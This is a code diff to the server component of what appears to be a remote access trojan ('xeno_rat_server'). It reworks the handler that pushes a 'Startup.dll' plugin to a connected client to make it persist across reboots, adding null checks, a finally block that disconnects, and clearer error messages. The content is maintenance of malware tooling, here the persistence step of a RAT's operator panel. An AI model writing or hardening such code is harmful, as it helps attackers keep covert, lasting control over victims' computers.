@@ -1201,30 +1201,58 @@ namespace xeno_rat_server
         {
             try
             {
+                if (client == null)
+                {
+                    MessageBox.Show("Client connection error!");
+                    return;
+                }
+
                 Node subClient = await client.CreateSubNodeAsync(2);
+                if (subClient == null)
+                {
+                    MessageBox.Show("Failed to create sub-node!");
+                    return;
+                }
+
                 bool worked = await Utils.LoadDllAsync(subClient, "Startup", File.ReadAllBytes("plugins\\Startup.dll"), AddLog);
                 if (!worked)
                 {
                     MessageBox.Show("Error Starting Startup dll!");
+                    subClient.Disconnect();
                     return;
                 }
-                await subClient.SendAsync(new byte[] { 0 });
-                bool Startupworked=(await subClient.ReceiveAsync())[0]==1;
-                if (Startupworked)
+
+                try
                 {
-                    MessageBox.Show("File added to startup!");
+                    await subClient.SendAsync(new byte[] { 0 });
+                    byte[] response = await subClient.ReceiveAsync();
+
+                    if (response != null && response.Length > 0)
+                    {
+                        bool startupWorked = response[0] == 1;
+                        MessageBox.Show(startupWorked ?
+                            "File added to startup!" :
+                            "Failed to add to startup!");
+                    }
+                    else
+                    {
+                        MessageBox.Show("Client restart pleas wait..");
+                    }
                 }
-                else 
-                { 
-                    MessageBox.Show("Failed to add to startup!");
+                finally
+                {
+                    if (subClient != null)
+                    {
+                        subClient.Disconnect();
+                    }
                 }
-                subClient.Disconnect();
             }
-            catch
+            catch (Exception ex)
             {
-                MessageBox.Show("Error with Startup dll!");
+                MessageBox.Show($"Error with Startup: {ex.Message}");
             }
         }
+
         private async Task StartRemoveStartup(Node client)
         {
             try
